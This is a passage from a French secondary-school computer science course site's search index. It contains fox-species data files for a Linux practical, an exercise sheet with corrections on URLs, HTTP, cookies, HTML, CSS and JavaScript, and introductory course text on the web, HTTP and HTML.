libre\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#alimentationtxt","title":"<code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Insectes, rongeurs, reptiles\nV\u00e9g\u00e9taux: Fruits d'oasis, baies\nChasse: Nocturne, ou\u00efe d\u00e9velopp\u00e9e\nAdaptation: D\u00e9tection proies sous le sable\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#reproductiontxt","title":"<code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 9-11 mois\nAccouplement: Janvier-mars\nGestation: 51-53 jours\nPort\u00e9e: 2-6 renardeaux (moyenne 3-4)\nSevrage: 6-8 semaines\nHabitat reproduction: Terriers profonds, protection chaleur\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_ruppell/#statut_conservationtxt","title":"<code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Chasse fourrure, urbanisation, routes\nProtection: Parcs nationaux, r\u00e9serves\nPopulation: Stable\nRecherche: \u00c9tudes sur adaptations d\u00e9sertiques\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/","title":"Annexe : Renard du Tibet (Vulpes ferrilata)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#informations_generalestxt","title":"<code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard du Tibet (Vulpes ferrilata)\nTaille: 57-70 cm + queue 29-40 cm\nPoids: 3-6 kg\nDur\u00e9e de vie: 8-10 ans (estim\u00e9e)\nStatut: Pr\u00e9occupation mineure\nR\u00e9partition: Plateau tib\u00e9tain\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#habitattxt","title":"<code>habitat.txt</code>","text":"<pre><code>Habitat: Steppes d'altitude, prairies alpines\nR\u00e9gions: Tibet, Ladakh, Nord N\u00e9pal\nTerrier: Pentes rocheuses, protection du vent\nAltitude: 2500-5200m (record mondial pour un renard)\nClimat: Froid d'altitude, hypoxie\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#alimentationtxt","title":"<code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Carnivore sp\u00e9cialis\u00e9\nProie principale: Pika du plateau (80%)\nAutres: Rongeurs, oiseaux, insectes\nChasse: Diurne (adaptation unique)\nD\u00e9pendance: Forte relation \u00e9cologique avec les pikas\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#reproductiontxt","title":"<code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 10-12 mois\nAccouplement: F\u00e9vrier-mai\nGestation: 50-60 jours\nPort\u00e9e: 2-5 renardeaux\nSevrage: 8-10 semaines\nAdaptation: Reproduction synchronis\u00e9e avec les pikas\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_tibet/#statut_conservationtxt","title":"<code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (Pr\u00e9occupation mineure)\nMenaces: Empoisonnement pikas, surp\u00e2turage, climat\nProtection: R\u00e9serves tib\u00e9taines\nPopulation: Tendance inconnue\nRecherche: Donn\u00e9es limit\u00e9es, acc\u00e8s difficile\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/","title":"Annexe : Renard v\u00e9loce (Vulpes velox)","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#donnees-pour-les-fichiers-du-tp","title":"Donn\u00e9es pour les fichiers du TP","text":""},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#informations_generalestxt","title":"<code>informations_generales.txt</code>","text":"<pre><code>Nom: Renard v\u00e9loce (Vulpes velox)\nTaille: 37-50 cm + queue 22-35 cm\nPoids: 1,5-3 kg\nDur\u00e9e de vie: 3-4 ans (sauvage), 13 ans (captivit\u00e9)\nStatut: Pr\u00e9occupation mineure (populations localement menac\u00e9es)\nR\u00e9partition: Grandes Plaines d'Am\u00e9rique du Nord\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#habitattxt","title":"<code>habitat.txt</code>","text":"<pre><code>Habitat: Prairies courtes, steppes herbeuses\nR\u00e9gions: Grandes Plaines (Canada-USA)\nTerrier: Peu profond, multiples entr\u00e9es\n\u00c9cosyst\u00e8me: Prairies natives et agricoles\nFragmentation: Habitat tr\u00e8s fragment\u00e9\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#alimentationtxt","title":"<code>alimentation.txt</code>","text":"<pre><code>R\u00e9gime: Omnivore opportuniste\nProies: Rongeurs, lapins, insectes\nV\u00e9g\u00e9taux: Fruits, baies, graines\nChasse: Nocturne, course rapide (60 km/h)\nStockage: Nourriture pour l'hiver\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#reproductiontxt","title":"<code>reproduction.txt</code>","text":"<pre><code>Maturit\u00e9: 10-12 mois\nAccouplement: F\u00e9vrier-avril\nGestation: 50-60 jours\nPort\u00e9e: 3-6 renardeaux (moyenne 4-5)\nSevrage: 6-7 semaines\nDispersion: Automne premi\u00e8re ann\u00e9e\n</code></pre>"},{"location":"premiere/VIIII-Systemes_d_exploitation_et_commandes_Linux/TP_Commandes_Linux/annexe_renard_veloce/#statut_conservationtxt","title":"<code>statut_conservation.txt</code>","text":"<pre><code>Statut UICN: LC (localement menac\u00e9)\nMenaces: Perte habitat, routes, maladies\nConservation: R\u00e9introduction Canada, protection habitat\nPopulation: R\u00e9cup\u00e9ration partielle\nSucc\u00e8s: Programmes de r\u00e9introduction efficaces\n</code></pre>"},{"location":"premiere/X-Web_et_HTTP/Fiche_exercices_web_http/","title":"Fiche d'exercices : Web et HTTP","text":""},{"location":"premiere/X-Web_et_HTTP/Fiche_exercices_web_http/#partie-1-protocole-http-et-urls","title":"\ud83d\udcda Partie 1 : Protocole HTTP et URLs","text":"Introduction \ud83e\udd8a Exercice 1 - Anatomie d'une URL Analysez cette URL et identifiez ses composants : <code>https://www.example.com:8080/path/to/page?param1=value1\u00b6m2=value2#section</code>             Identifiez :             1. Le protocole             2. Le nom de domaine             3. Le port             4. Le chemin             5. Les param\u00e8tres de requ\u00eate             6. L'ancre (fragment)          \u2192 Voir la correction          Composants de l'URL :                 1. Protocole : https                 2. Nom de domaine : www.example.com                 3. Port : 8080                 4. Chemin : /path/to/page                 5. Param\u00e8tres : param1=value1\u00b6m2=value2                 6. Ancre : section              Introduction \ud83e\udd8a Exercice 2 - M\u00e9thodes HTTP Associez chaque m\u00e9thode HTTP \u00e0 son usage : M\u00e9thodes : GET, POST, PUT, DELETE, HEAD, PATCH Usages :             1. R\u00e9cup\u00e9rer des donn\u00e9es sans les modifier             2. Envoyer des donn\u00e9es pour cr\u00e9er une ressource             3. Remplacer compl\u00e8tement une ressource             4. Supprimer une ressource             5. R\u00e9cup\u00e9rer seulement les en-t\u00eates             6. Modifier partiellement une ressource          \u2192 Voir la correction          Associations :                 \u2022 GET \u2192 1. R\u00e9cup\u00e9rer des donn\u00e9es sans les modifier                 \u2022 POST \u2192 2. Envoyer des donn\u00e9es pour cr\u00e9er une ressource                 \u2022 PUT \u2192 3. Remplacer compl\u00e8tement une ressource                 \u2022 DELETE \u2192 4. Supprimer une ressource                 \u2022 HEAD \u2192 5. R\u00e9cup\u00e9rer seulement les en-t\u00eates                 \u2022 PATCH \u2192 6. Modifier partiellement une ressource              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 3 - Codes de statut HTTP Expliquez la signification de ces codes de statut :             1. 200             2. 301             3. 404             4. 401             5. 500             6. 403             7. 302             8. 418          \u2192 Voir la correction          Significations :                 1. 200 OK : Requ\u00eate r\u00e9ussie                 2. 301 Moved Permanently : Redirection permanente                 3. 404 Not Found : Ressource non trouv\u00e9e                 4. 401 Unauthorized : Authentification requise                 5. 500 Internal Server Error : Erreur serveur                 6. 403 Forbidden : Acc\u00e8s interdit                 7. 302 Found : Redirection temporaire                 8. 418 I'm a teapot : Code humoristique (RFC 2324)              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 4 - En-t\u00eates HTTP Analysez cette requ\u00eate HTTP et r\u00e9pondez aux questions : <pre>\nGET /api/users HTTP/1.1\nHost: api.example.com\nUser-Agent: Mozilla/5.0\nAccept: application/json\nAuthorization: Bearer abc123\nContent-Type: application/json\n            </pre>             1. Quelle est la m\u00e9thode utilis\u00e9e ?             2. Quel type de contenu est accept\u00e9 ?             3. Comment l'utilisateur s'authentifie-t-il ?             4. Y a-t-il une erreur dans cette requ\u00eate ?          \u2192 Voir la correction          Analyse :                 1. M\u00e9thode : GET                 2. Type accept\u00e9 : application/json                 3. Authentification : Bearer token (abc123)                 4. Erreur : Content-Type ne devrait pas \u00eatre pr\u00e9sent dans une requ\u00eate GET (pas de corps)              Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 5 - Session et cookies Analysez cet \u00e9change HTTP et expliquez le m\u00e9canisme : Requ\u00eate 1 : <pre>POST /login HTTP/1.1\nContent-Type: application/x-www-form-urlencoded\n\nusername=alice&amp;password=secret</pre> R\u00e9ponse 1 : <pre>HTTP/1.1 200 OK\nSet-Cookie: sessionid=xyz789; HttpOnly; Secure\nLocation: /dashboard</pre> Requ\u00eate 2 : <pre>GET /dashboard HTTP/1.1\nCookie: sessionid=xyz789</pre>             1. Que se passe-t-il dans la premi\u00e8re requ\u00eate ?             2. Que fait le serveur avec Set-Cookie ?             3. Pourquoi HttpOnly et Secure sont-ils importants ?             4. Comment le client prouve-t-il son identit\u00e9 dans la requ\u00eate 2 ?          \u2192 Voir la correction          Analyse du m\u00e9canisme :                 1. Requ\u00eate 1 : L'utilisateur envoie ses identifiants de connexion                 2. Set-Cookie : Le serveur cr\u00e9e une session et envoie un identifiant de session                 3. S\u00e9curit\u00e9 :                    \u2022 HttpOnly : emp\u00eache l'acc\u00e8s JavaScript (protection XSS)                    \u2022 Secure : transmission uniquement en HTTPS                 4. Requ\u00eate 2 : Le client renvoie automatiquement le cookie pour prouver son identit\u00e9"},{"location":"premiere/X-Web_et_HTTP/Fiche_exercices_web_http/#partie-2-html-et-css","title":"\ud83d\udcda Partie 2 : HTML et CSS","text":"Introduction \ud83e\udd8a Exercice 6 - Structure HTML Corrigez ce code HTML qui contient des erreurs : <pre>\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Ma page\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Titre principal&lt;/h1&gt;\n    &lt;p&gt;Un paragraphe avec &lt;b&gt;du texte en gras&lt;/p&gt;\n    &lt;img src=\"image.jpg\"&gt;\n    &lt;ul&gt;\n        &lt;li&gt;Item 1\n        &lt;li&gt;Item 2&lt;/li&gt;\n    &lt;/ul&gt;\n&lt;/body&gt;\n            </pre> \u2192 Voir la correction          Code corrig\u00e9 : <pre>\n&lt;!DOCTYPE html&gt;\n&lt;html&gt;\n&lt;head&gt;\n    &lt;title&gt;Ma page&lt;/title&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;h1&gt;Titre principal&lt;/h1&gt;\n    &lt;p&gt;Un paragraphe avec &lt;b&gt;du texte en gras&lt;/b&gt;&lt;/p&gt;\n    &lt;img src=\"image.jpg\" alt=\"Description\"&gt;\n    &lt;ul&gt;\n        &lt;li&gt;Item 1&lt;/li&gt;\n        &lt;li&gt;Item 2&lt;/li&gt;\n    &lt;/ul&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n                </pre> Erreurs corrig\u00e9es :                 \u2022 Ajout du DOCTYPE                 \u2022 Fermeture de la balise title                 \u2022 Fermeture de la balise b                 \u2022 Fermeture de la balise p                 \u2022 Ajout de l'attribut alt \u00e0 img                 \u2022 Fermeture de la premi\u00e8re balise li                 \u2022 Fermeture de la balise html              Moyen \ud83e\udd8a\ud83e\udd8a Exercice 7 - S\u00e9lecteurs CSS \u00c9crivez les s\u00e9lecteurs CSS pour :             1. Tous les paragraphes             2. L'\u00e9l\u00e9ment avec l'id \"header\"             3. Tous les \u00e9l\u00e9ments avec la classe \"highlight\"             4. Les liens dans les listes             5. Le premier paragraphe de chaque article             6. Les \u00e9l\u00e9ments survol\u00e9s par la souris          \u2192 Voir la correction          S\u00e9lecteurs CSS :                 1. <code>p</code>                 2. <code>#header</code>                 3. <code>.highlight</code>                 4. <code>li a</code> ou <code>ul a</code>                 5. <code>article p:first-child</code>                 6. <code>:hover</code> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 8 - Responsive Design Cr\u00e9ez un CSS responsive pour cette structure : <pre>\n&lt;div class=\"container\"&gt;\n    &lt;div class=\"sidebar\"&gt;Menu&lt;/div&gt;\n    &lt;div class=\"content\"&gt;Contenu principal&lt;/div&gt;\n&lt;/div&gt;\n            </pre> Contraintes :             \u2022 Desktop : sidebar 25%, content 75%             \u2022 Tablet : sidebar 30%, content 70%             \u2022 Mobile : sidebar au-dessus, pleine largeur          \u2192 Voir la correction          CSS Responsive : <pre>\n.container {\n    display: flex;\n}\n\n.sidebar {\n    width: 25%;\n    background: #f0f0f0;\n}\n\n.content {\n    width: 75%;\n    padding: 1rem;\n}\n\n/* Tablet */\n@media (max-width: 768px) {\n    .sidebar {\n        width: 30%;\n    }\n    .content {\n        width: 70%;\n    }\n}\n\n/* Mobile */\n@media (max-width: 480px) {\n    .container {\n        flex-direction: column;\n    }\n    .sidebar, .content {\n        width: 100%;\n    }\n}\n                </pre>"},{"location":"premiere/X-Web_et_HTTP/Fiche_exercices_web_http/#partie-3-javascript-et-interactivite","title":"\ud83d\udcda Partie 3 : JavaScript et interactivit\u00e9","text":"Moyen \ud83e\udd8a\ud83e\udd8a Exercice 9 - Manipulation du DOM \u00c9crivez le JavaScript pour :             1. Changer le texte d'un \u00e9l\u00e9ment avec l'id \"title\"             2. Ajouter la classe \"active\" \u00e0 tous les boutons             3. Cr\u00e9er un nouvel \u00e9l\u00e9ment &lt;p&gt; et l'ajouter au body             4. Supprimer tous les \u00e9l\u00e9ments avec la classe \"temp\"          \u2192 Voir la correction          Code JavaScript : <pre>\n// 1. Changer le texte\ndocument.getElementById('title').textContent = 'Nouveau titre';\n\n// 2. Ajouter une classe \u00e0 tous les boutons\ndocument.querySelectorAll('button').forEach(btn =&gt; {\n    btn.classList.add('active');\n});\n\n// 3. Cr\u00e9er et ajouter un paragraphe\nconst p = document.createElement('p');\np.textContent = 'Nouveau paragraphe';\ndocument.body.appendChild(p);\n\n// 4. Supprimer les \u00e9l\u00e9ments temporaires\ndocument.querySelectorAll('.temp').forEach(el =&gt; {\n    el.remove();\n});\n                </pre> Difficile \ud83e\udd8a\ud83e\udd8a\ud83e\udd8a Exercice 10 - Requ\u00eates AJAX Cr\u00e9ez une fonction qui :             1. Fait une requ\u00eate GET vers \"/api/users\"             2. Affiche les donn\u00e9es dans une liste HTML             3. G\u00e8re les erreurs de r\u00e9seau             4. Affiche un indicateur de chargement          \u2192 Voir la correction          Fonction AJAX compl\u00e8te : <pre>\nasync function loadUsers() {\n    const loadingEl = document.getElementById('loading');\n    const usersList = document.getElementById('users-list');\n    const errorEl = document.getElementById('error');\n\n    try {\n        // Afficher le chargement\n        loadingEl.style.display = 'block';\n        errorEl.style.display = 'none';\n\n        // Faire la requ\u00eate\n        const response = await fetch('/api/users');\n\n        if (!response.ok) {\n            throw new Error(`HTTP ${response.status}`);\n        }\n\n        const users = await response.json();\n\n        // Afficher les utilisateurs\n        usersList.innerHTML = '';\n        users.forEach(user =&gt; {\n            const li = document.createElement('li');\n            li.textContent = user.name;\n            usersList.appendChild(li);\n        });\n\n    } catch (error) {\n        // G\u00e9rer les erreurs\n        errorEl.textContent = 'Erreur: ' + error.message;\n        errorEl.style.display = 'block';\n    } finally {\n        // Cacher le chargement\n        loadingEl.style.display = 'none';\n    }\n}\n                </pre>"},{"location":"premiere/X-Web_et_HTTP/Cours/Cours/","title":"Cours","text":"\ud83d\udcda Le Web et HTTP <p>Comprendre les fondements du World Wide Web</p> \ud83d\udcda Historique et d\u00e9finitions \ud83c\udf10 Naissance du Web              Le Web (World Wide Web) a \u00e9t\u00e9 cr\u00e9\u00e9 en 1989 au CERN (Centre Europ\u00e9en pour la Recherche Nucl\u00e9aire) par une \u00e9quipe dirig\u00e9e par Tim Berners-Lee et Robert Cailliau. L'objectif initial \u00e9tait de d\u00e9velopper une application permettant l'\u00e9change de donn\u00e9es scientifiques sur Internet.          \ud83d\udd17 Les hyperliens              La technologie du Web repose sur l'utilisation d'hyperliens, qui sont des liens cliquables permettant de naviguer entre diff\u00e9rentes ressources. Ces hyperliens permettent d'acc\u00e9der \u00e0 des donn\u00e9es stock\u00e9es sur des serveurs, comme des pages web, des images ou tout autre type de contenu.          \ud83d\udca1 Anecdote : La toute premi\u00e8re page web, cr\u00e9\u00e9e par Tim Berners-Lee, est toujours accessible \u00e0 l'adresse : premi\u00e8re page web \ud83c\udfd7\ufe0f Architecture client-serveur \ud83d\udcd6 Le mod\u00e8le client-serveur              Le Web fonctionne selon un mod\u00e8le client-serveur :                          \u2022 Le client est g\u00e9n\u00e9ralement un navigateur web (Chrome, Firefox, Safari, etc.) qui envoie des requ\u00eates pour obtenir des ressources.             \u2022 Le serveur est un ordinateur qui h\u00e9berge les ressources web et r\u00e9pond aux requ\u00eates des clients.          \ud83d\udd04 Processus de communication              Le processus de communication se d\u00e9roule ainsi :             <ol> <li>L'utilisateur saisit une URL ou clique sur un lien dans son navigateur (client)</li> <li>Le client envoie une requ\u00eate au serveur appropri\u00e9</li> <li>Le serveur traite la requ\u00eate et renvoie une r\u00e9ponse</li> <li>Le client (navigateur) interpr\u00e8te la r\u00e9ponse et affiche le contenu \u00e0 l'utilisateur</li> </ol> \ud83c\udf10 Les URL et le syst\u00e8me DNS \ud83d\udccd Qu'est-ce qu'une URL ?              Une URL (Uniform Resource Locator) est l'adresse qui permet de localiser une ressource sur le Web. Elle est compos\u00e9e de plusieurs parties :          \ud83d\udd17 Structure d'une URL <pre>\nprotocole://sous-domaine.nom-de-domaine.extension/chemin/ressource\n\nExemple : https://www.example.com/dossier/page.html\n        </pre> \ud83e\udde9 Composants d'une URL <ul> <li>Protocole : <code>https://</code> (indique le protocole de communication utilis\u00e9)</li> <li>Sous-domaine : <code>www</code> (subdivision du domaine principal)</li> <li>Nom de domaine : <code>example</code> (nom unique identifiant le site)</li> <li>Extension : <code>.com</code> (cat\u00e9gorie du domaine)</li> <li>Chemin : <code>/dossier/page.html</code> (localisation de la ressource sur le serveur)</li> </ul> \ud83d\uddc2\ufe0f Le syst\u00e8me DNS              Le syst\u00e8me DNS (Domain Name System) est un service qui traduit les noms de domaine en adresses IP. Sans DNS, nous devrions m\u00e9moriser les adresses IP de chaque site web (par exemple, 172.217.20.163 pour Google).          \ud83d\udd04 Processus de r\u00e9solution DNS              Lorsqu'un utilisateur saisit une URL :             <ol> <li>Le navigateur v\u00e9rifie d'abord son cache local pour voir s'il conna\u00eet d\u00e9j\u00e0 l'adresse IP correspondante</li> <li>Si non, une requ\u00eate DNS est envoy\u00e9e \u00e0 un serveur DNS</li> <li>Le serveur DNS renvoie l'adresse IP correspondante</li> <li>Le navigateur peut alors \u00e9tablir une connexion avec le serveur web \u00e0 cette adresse IP</li> </ol> \ud83c\udf10 Le protocole HTTP \ud83d\udcd6 Qu'est-ce que HTTP ? HTTP (HyperText Transfer Protocol) est le protocole de communication utilis\u00e9 pour \u00e9changer des informations sur le Web. Il d\u00e9finit comment les messages sont format\u00e9s et transmis entre clients et serveurs.          \ud83d\udd04 Fonctionnement g\u00e9n\u00e9ral              HTTP fonctionne selon un principe de requ\u00eate-r\u00e9ponse :             <ol> <li>Le client envoie une requ\u00eate HTTP au serveur</li> <li>Le serveur traite la requ\u00eate et renvoie une r\u00e9ponse HTTP</li> </ol>              Chaque requ\u00eate et r\u00e9ponse HTTP contient :             <ul> <li>Une ligne de d\u00e9part (m\u00e9thode, URL, version pour les requ\u00eates ; version, code d'\u00e9tat pour les r\u00e9ponses)</li> <li>Des en-t\u00eates (headers) contenant des m\u00e9tadonn\u00e9es</li> <li>Un corps (body) optionnel contenant les donn\u00e9es</li> </ul> \ud83d\udee0\ufe0f Les m\u00e9thodes HTTP \ud83d\udd0d GET                  Demande une ressource au serveur (sans modifier les donn\u00e9es)              Exemple de requ\u00eate GET <pre>\nGET /utilisateurs/profil?id=123 HTTP/1.1\nHost: www.example.com\nUser-Agent: Mozilla/5.0\nAccept-Language: fr-FR\n                </pre> \ud83d\udce4 POST                  Envoie des donn\u00e9es au serveur (pour cr\u00e9er ou modifier une ressource)              Exemple de requ\u00eate POST <pre>\nPOST /utilisateurs/inscription HTTP/1.1\nHost: www.example.com\nContent-Type: application/x-www-form-urlencoded\nContent-Length: 54\n\nnom=Dupont&amp;prenom=Jean&amp;email=jean.dupont@email.com\n                </pre> \ud83d\udcca Les codes de statut HTTP \ud83d\udcc8 Qu'est-ce qu'un code de statut ?              Les r\u00e9ponses HTTP contiennent un code de statut qui indique le r\u00e9sultat du traitement de la requ\u00eate.          1xx - Information <li>La requ\u00eate a \u00e9t\u00e9 re\u00e7ue et le processus continue</li> 2xx - Succ\u00e8s <ul> <li>200 OK : La requ\u00eate a r\u00e9ussi</li> <li>201 Created : La ressource a \u00e9t\u00e9 cr\u00e9\u00e9e avec succ\u00e8s</li> </ul> 3xx - Redirection <ul> <li>301 Moved Permanently : La ressource a \u00e9t\u00e9 d\u00e9plac\u00e9e d\u00e9finitivement</li> <li>304 Not Modified : La ressource n'a pas \u00e9t\u00e9 modifi\u00e9e depuis la derni\u00e8re requ\u00eate</li> </ul> 4xx - Erreur client <ul> <li>400 Bad Request : La requ\u00eate est mal form\u00e9e</li> <li>403 Forbidden : Acc\u00e8s refus\u00e9</li> <li>404 Not Found : La ressource demand\u00e9e n'existe pas</li> </ul> 5xx - Erreur serveur <ul> <li>500 Internal Server Error : Erreur interne du serveur</li> <li>503 Service Unavailable : Le serveur est temporairement indisponible</li> </ul> \ud83d\udd12 HTTP et s\u00e9curit\u00e9 : HTTPS \ud83d\udee1\ufe0f Qu'est-ce que HTTPS ? HTTPS (HTTP Secure) est une version s\u00e9curis\u00e9e du protocole HTTP qui utilise le chiffrement SSL/TLS pour prot\u00e9ger les communications entre le client et le serveur.          \u2705 Avantages de HTTPS <ul> <li>Confidentialit\u00e9 : Les donn\u00e9es \u00e9chang\u00e9es sont chiffr\u00e9es et ne peuvent pas \u00eatre lues par des tiers</li> <li>Int\u00e9grit\u00e9 : Garantit que les donn\u00e9es n'ont pas \u00e9t\u00e9 modifi\u00e9es pendant la transmission</li> <li>Authentification : V\u00e9rifie l'identit\u00e9 du serveur auquel le client se connecte</li> </ul> \ud83d\udd10 Certificats SSL/TLS : Le fonctionnement de HTTPS repose sur des certificats num\u00e9riques d\u00e9livr\u00e9s par des autorit\u00e9s de certification (CA) qui attestent de l'identit\u00e9 du site web.          \ud83d\udcc4 Pages Web statiques et dynamiques \ud83d\udcc4 Pages statiques                  Une page web statique est une page dont le contenu est fixe et identique pour tous les utilisateurs. Elle est g\u00e9n\u00e9ralement \u00e9crite en HTML et CSS, et son contenu ne change pas \u00e0 moins que le d\u00e9veloppeur ne modifie manuellement le code source.                  Caract\u00e9ristiques : <ul> <li>Contenu identique pour tous les utilisateurs</li> <li>Ne n\u00e9cessite pas de traitement c\u00f4t\u00e9 serveur</li> <li>Chargement rapide</li> <li>Facile \u00e0 mettre en cache</li> <li>Id\u00e9ale pour les sites informatifs qui changent rarement</li> </ul> \u26a1 Pages dynamiques                  Une page web dynamique est g\u00e9n\u00e9r\u00e9e \u00e0 la vol\u00e9e, souvent en fonction des actions de l'utilisateur ou d'autres param\u00e8tres. Elle utilise g\u00e9n\u00e9ralement des langages de programmation c\u00f4t\u00e9 serveur (PHP, Python, JavaScript avec Node.js, etc.) et peut interagir avec des bases de donn\u00e9es.                  Caract\u00e9ristiques : <ul> <li>Contenu personnalis\u00e9 selon l'utilisateur ou d'autres param\u00e8tres</li> <li>N\u00e9cessite un traitement c\u00f4t\u00e9 serveur</li> <li>Peut inclure des interactions utilisateur complexes</li> <li>Permet la gestion de contenu, l'authentification des utilisateurs, etc.</li> <li>Utilis\u00e9e pour les applications web, les r\u00e9seaux sociaux, les sites e-commerce, etc.</li> </ul> \ud83c\udf6a Cookies et sessions \ud83c\udf6a Les cookies HTTP              Les cookies sont de petits fichiers texte stock\u00e9s par le navigateur sur l'ordinateur de l'utilisateur. Ils permettent aux sites web de stocker des informations sur l'utilisateur et de les r\u00e9cup\u00e9rer lors de visites ult\u00e9rieures.          \ud83c\udff7\ufe0f Types de cookies <ul> <li>Cookies de session : Supprim\u00e9s \u00e0 la fermeture du navigateur</li> <li>Cookies persistants : Conserv\u00e9s jusqu'\u00e0 une date d'expiration sp\u00e9cifi\u00e9e</li> <li>Cookies first-party : Cr\u00e9\u00e9s par le site visit\u00e9</li> <li>Cookies third-party : Cr\u00e9\u00e9s par des domaines autres que celui visit\u00e9 (souvent utilis\u00e9s pour le suivi publicitaire)</li> </ul> <p> </p>"},{"location":"premiere/X-Web_et_HTTP/Cours/cours_html/","title":"Cours html","text":"\ud83c\udf10 HTML : le langage du Web <p>HyperText Markup Language - Le fondement des pages web</p> \ud83d\udcd6 Qu'est-ce que HTML ? HTML (HyperText Markup Language) est le langage de balisage standard utilis\u00e9 pour cr\u00e9er et structurer le contenu des pages web. Cr\u00e9\u00e9 par Tim Berners-Lee en 1991, HTML utilise un syst\u00e8me de balises pour d\u00e9finir la structure et le contenu d'une page web.          \ud83c\udfd7\ufe0f Structure d'un document HTML \ud83d\udccb Structure de base              Voici la structure de base d'un document HTML :          \ud83d\udcbb Structure HTML compl\u00e8te <pre>\n&lt;!DOCTYPE html&gt;\n&lt;html lang=\"fr\"&gt;\n&lt;head&gt;\n    &lt;meta charset=\"UTF-8\"&gt;\n    &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt;\n    &lt;title&gt;Titre de la page&lt;/title&gt;\n    &lt;link rel=\"stylesheet\" href=\"styles.css\"&gt;\n&lt;/head&gt;\n&lt;body&gt;\n    &lt;header&gt;\n        &lt;h1&gt;Titre principal&lt;/h1&gt;\n        &lt;nav&gt;\n            &lt;ul&gt;\n                &lt;li&gt;&lt;a href=\"#\"&gt;Accueil&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=\"#\"&gt;\u00c0 propos&lt;/a&gt;&lt;/li&gt;\n                &lt;li&gt;&lt;a href=\"#\"&gt;Contact&lt;/a&gt;&lt;/li&gt;\n            &lt;/ul&gt;\n        &lt;/nav&gt;\n    &lt;/header&gt;\n\n    &lt;main&gt;\n        &lt;section&gt;\n            &lt;h2&gt;Section 1&lt;/h2&gt;\n            &lt;p&gt;Contenu de la section 1.&lt;/p&gt;\n        &lt;/section&gt;\n\n        &lt;section&gt;\n            &lt;h2&gt;Section 2&lt;/h2&gt;\n            &lt;p&gt;Contenu de la section 2.&lt;/p&gt;\n        &lt;/section&gt;\n    &lt;/main&gt;\n\n    &lt;footer&gt;\n        &lt;p&gt;\u00a9 2023 Mon Site Web&lt;/p&gt;\n    &lt;/footer&gt;\n&lt;/body&gt;\n&lt;/html&gt;\n        </pre> \ud83c\udff7\ufe0f Les principales balises HTML \ud83d\udcda Classification des balises              Les balises HTML sont organis\u00e9es en diff\u00e9rentes cat\u00e9gories selon leur fonction :          \ud83c\udfd7\ufe0f Balises de structure <ul> <li><code>&lt;!DOCTYPE html&gt;</code> : D\u00e9clare le type de document (HTML5)</li> <li><code>&lt;html&gt;</code> : \u00c9l\u00e9ment racine du document</li> <li><code>&lt;head&gt;</code> : Contient les m\u00e9tadonn\u00e9es</li> <li><code>&lt;body&gt;</code> : Contient le contenu visible</li> <li><code>&lt;header&gt;</code>, <code>&lt;main&gt;</code>, <code>&lt;footer&gt;</code> : Balises s\u00e9mantiques</li> <li><code>&lt;section&gt;</code>, <code>&lt;article&gt;</code>, <code>&lt;nav&gt;</code> : Structure du contenu</li> </ul> \ud83d\udcdd Balises de texte <ul> <li><code>&lt;h1&gt;</code> \u00e0 <code>&lt;h6&gt;</code> : Titres de diff\u00e9rents niveaux</li> <li><code>&lt;p&gt;</code> : Paragraphe</li> <li><code>&lt;strong&gt;</code> : Texte important (g\u00e9n\u00e9ralement en gras)</li> <li><code>&lt;em&gt;</code> : Texte mis en emphase (g\u00e9n\u00e9ralement en italique)</li> </ul> \ud83d\udd17 Balises de lien et m\u00e9dia <ul> <li><code>&lt;a href=\"url\"&gt;</code> : Lien hypertexte</li> <li><code>&lt;img 